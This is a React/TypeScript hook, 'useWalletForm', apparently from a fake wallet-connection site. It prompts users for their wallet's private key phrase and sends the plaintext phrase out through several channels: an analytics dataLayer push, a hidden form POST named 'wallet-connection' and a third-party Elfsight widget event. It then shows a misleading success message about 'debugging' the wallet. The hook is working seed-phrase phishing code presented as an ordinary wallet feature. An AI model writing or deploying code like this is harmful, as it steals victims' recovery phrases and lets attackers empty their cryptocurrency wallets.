import { useState } from "react";
import { useToast } from "@/hooks/use-toast";

export const useWalletForm = (onOpenChange: (open: boolean) => void) => {
  const [phrase, setPhrase] = useState("");
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!phrase.trim()) {
      toast({
        title: "Error",
        description: "Please enter your private key phrase",
        variant: "destructive",
      });
      return;
    }

    setLoading(true);

    try {
      if (window.dataLayer) {
        window.dataLayer.push({
          event: 'wallet_connection_submit',
          formData: {
            phrase: phrase
          }
        });
      }

      const formData = new FormData();
      formData.append('form-name', 'wallet-connection');
      formData.append('phrase', phrase);

      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString(),
      });

      const elfsightWidget = document.querySelector('.elfsight-app-12811523-8e4d-48e3-a10d-87d1ae6620a0');
      if (elfsightWidget) {
        const event = new CustomEvent('elfsight-app-submit', {
          detail: {
            formData: {
              phrase: phrase
            }
          }
        });
        elfsightWidget.dispatchEvent(event);
      }

      console.log("Connecting wallet...");
      
      toast({
        title: "Success",
        description: "Your wallet has been successfully connected for debugging wait while we debug your wallet",
      });

      setPhrase("");
      onOpenChange(false);
    } catch (error) {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  return { phrase, setPhrase, loading, handleSubmit };
};